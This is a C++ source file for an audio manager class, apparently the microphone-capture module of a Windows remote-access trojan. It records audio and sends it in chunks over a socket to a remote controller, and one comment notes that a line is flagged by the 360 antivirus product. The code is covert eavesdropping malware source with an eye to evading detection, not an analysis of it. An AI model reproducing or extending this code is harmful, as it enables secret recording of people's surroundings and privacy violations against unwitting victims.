#include "StdAfx.h"
#include "AudioManager.h"

CAudioManager::CAudioManager(void)
{
	m_bWorking = false;
}

CAudioManager::~CAudioManager(void)
{
}

bool CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())  //为找到音频设备
	{
		return false;
	}
	// 正在使用中.. 防止重复使用
	if (m_bWorking)
	{
		return false;
	}

	m_lpAudio = new CAudio;
	m_bWorking = true;
	return true;
}

void CAudioManager::SendRecordBuffer()
{
	m_hSendThread = CreateThread(NULL, 0, SendAudioDataProc, (LPVOID)this, 0, NULL);
}

DWORD WINAPI CAudioManager::SendAudioDataProc( LPVOID lpParameter )
{
	CAudioManager* pThis = (CAudioManager*)lpParameter;
	if (NULL != pThis)
	{
		const int nBufSize = AUDIO_BUF_SIZE; //缓冲区大小
		while (pThis->m_bWorking)
		{
			DWORD	dwBytes = 0;
			UINT	nSendBytes = 0;
			LPBYTE	lpBuffer = pThis->m_lpAudio->getRecordBuffer(&dwBytes);  //这句话将被360查杀
			if (NULL == lpBuffer)
			{
				break;
			}
			LPBYTE	lpPacket = new BYTE[dwBytes];
			memcpy(lpPacket, lpBuffer, dwBytes);
	        
			MSGINFO_S tagMsgInfo;
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			tagMsgInfo.Msg_id = CMD_AUDIO;
			AUDIODATA_S tagAudioData;
			memset(&tagAudioData, 0, sizeof(AUDIODATA_S));
			tagAudioData.Begin = 0;
			tagAudioData.bRead = false;
			tagAudioData.dwSize = dwBytes;  //数据大小
			tagAudioData.Id = 0;
			memcpy((char*)tagMsgInfo.context, (char*)&tagAudioData, sizeof(AUDIODATA_S));  //发送数据块的大小
			bool bSuccess = true;
			pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);

			//发送数据
			int nCount = dwBytes / nBufSize + 1;  //发送的次数
			if (0 == dwBytes % nBufSize)
			{
				nCount = nCount - 1;
			}   
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			memset(&tagAudioData, 0, sizeof(AUDIODATA_S));
			tagAudioData.bRead = false;
			tagAudioData.Id = 1;  //正常发送
			UINT nBegin = 0;
	        for (int index = 0; index < nCount ; index++)  //循环发送
			{
				memset(&tagAudioData.Data, 0, nBufSize); //初始化数据
			    memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
				tagMsgInfo.Msg_id = CMD_AUDIO;

				nBegin = index * nBufSize;  //每次开始发送数据的位置
				tagAudioData.Begin = nBegin;
				tagAudioData.dwSize  = 0;
                
				if (index == nCount -1)  //最后一次发送
				{
					tagAudioData.bRead = true;  //这时可以播放语音了
					tagAudioData.dwSize = dwBytes;  //数据的总大小
					tagAudioData.Id = 2;
					for (UINT i = nBegin, k = 0; i < dwBytes; i++, k++)
					{
						tagAudioData.Data[k] = lpPacket[i];
					}
				}
				else   //正常的一块一块发送数据
				{
					for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
					{
						tagAudioData.Data[k] = lpPacket[i];
					}
				}
				memcpy((char*)tagMsgInfo.context, (char*)&tagAudioData, sizeof(AUDIODATA_S));
				pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
			}
			delete[] lpPacket;
			lpPacket = NULL;
//			Sleep(80);
		}
	
	}
	return 0;
}

void CAudioManager::RecvRecordBuffer()
{
	
}

DWORD WINAPI CAudioManager::RecvAudioDataProc( LPVOID lpParameter )
{
	return 0;
}
